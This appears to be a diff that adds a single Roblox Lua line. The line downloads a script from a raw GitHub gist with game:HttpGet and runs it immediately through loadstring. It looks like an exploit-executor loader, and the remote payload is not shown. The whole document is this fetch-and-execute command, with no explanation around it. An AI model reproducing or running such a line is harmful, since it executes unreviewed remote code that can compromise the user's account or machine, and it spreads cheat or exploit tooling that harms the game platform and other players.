@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/silvayukizn-tech/57a51a3159e241747bd8d33a048d968e/raw/bed5fa3a842d3ce720645ed3a97de7e0bcfba42d/youki.lua"))()
